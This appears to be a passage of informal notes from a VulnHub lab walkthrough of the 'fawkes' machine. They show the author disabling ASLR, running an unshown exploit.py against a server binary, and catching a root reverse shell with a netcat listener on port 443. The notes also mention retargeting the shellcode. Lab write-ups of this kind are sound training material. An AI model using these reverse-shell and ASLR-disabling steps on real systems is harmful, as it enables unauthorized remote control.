───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ vi /proc/sys/kernel/randomize_va_space
❯ vi /proc/sys/kernel/randomize_va_space
❯ cat /proc/sys/kernel/randomize_va_space
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /proc/sys/kernel/randomize_va_space
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 0
───────┴─────────────────────────────────────
```
2 to 0 to make sure that the program works 
cat proc/sys/kernel/randomize_va_space it has to day 0


just run tt 

❯ ./server_hogwarts

----------------------

┌─[root@parrot]─[/home/z3kk3n/Desktop/vulnHUB/fawkes/exploits]
└──╼ #python3 exploit.py 

from another terminal open your conection with nc 

```bash 
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.53] from (UNKNOWN) [192.168.100.53] 41302
wjoami
//bin/sh: 1: wjoami: not found
whoami
root

```
so it works let's adapt it to explote fawkes 

a few changes 

we have to change the shell code and where we want to connect before we aim to our localHost






before you run your exploit.py make sure you specify where they have to go for that reason we import socket 

ejm

```bash



```






Happy hacking !
